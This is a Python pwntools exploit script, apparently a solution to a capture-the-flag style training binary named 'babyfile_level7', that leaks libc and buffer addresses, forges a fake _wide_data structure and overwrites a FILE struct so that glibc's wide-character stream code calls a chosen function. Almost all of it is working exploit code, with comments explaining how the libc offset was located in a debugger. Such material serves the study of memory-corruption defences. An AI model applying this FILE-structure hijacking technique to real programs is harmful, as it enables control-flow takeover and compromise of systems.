#!/usr/bin/env python3
from pwn import *

# Process setup
p = process('./babyfile_level7')
s = '''
b * fwrite
b * fwrite+184
b * __GI__IO_wdoallocbuf
b * _IO_wfile_overflow+41
'''
# Extract addresses
p.recvuntil(b'puts() within libc is: ')
puts_addr = int(p.recvline().strip(), 16)
p.recvuntil(b'name buffer is located at: ')
buf_addr = int(p.recvline().strip(), 16)

log.info(f"puts: {hex(puts_addr)}")
log.info(f"buf: {hex(buf_addr)}")


'''
__GI__IO_wdoallocbuf:

mov    rax,QWORD PTR [rdi+0xa0] # moving _wide_data into rax
...
mov    rax,QWORD PTR [rax+0xe0] # moving rax+0xe0 (vtable of _wide_data) back into rax
call   QWORD PTR [rax+0x68] # calls the pointer there + 0x68


'''
# Send name
p.recvuntil(b'Please enter your name.\n')
# Create fake _wide_data structure with vtable pointing to win
win = 0x004012e6
fake_wide_data = b'\x00' * 0x68
fake_wide_data += p64(win)
fake_wide_data += b'\x00' * (0xe0 - 0x70)
fake_wide_data += p64(buf_addr)
fake_wide_data = fake_wide_data.ljust(0x100, b'\x00')
p.send(fake_wide_data)

# Modify FILE struct
p.recvuntil(b'Now reading from stdin directly to the FILE struct.\n')


file_payload = b'\x00' * 0x88
file_payload += p64(buf_addr + 0x1f0)  # Some other field
file_payload += p64(0xffffffffffffffff)  # _offset (-1)
file_payload += b'\x00' * 0x8  # _codecvt
file_payload += p64(buf_addr)  # _wide_data
file_payload += b'\x00' * (0xe0 - 0xa8 - 8)  # Rest of struct
file_payload += p64(puts_addr + 0x1649d8 - 0x38)

'''
the offset 0x1649d8 is found by:

1. first pausing the program with pause()
2. open a new terminal, do `sudo gef -pid <pid>`
3. tele &_IO_wfile_overflow, to get the address of _IO_wfile_overflow
4. search-pattern <address>. Similar action in pwndbg is `search -t qword "<address>"`
5. x/x <address> - <puts_address>
'''
#file_payload = 'A'

gdb.attach(p, s)
time.sleep(2)
#pause()
p.send(file_payload)

p.interactive()

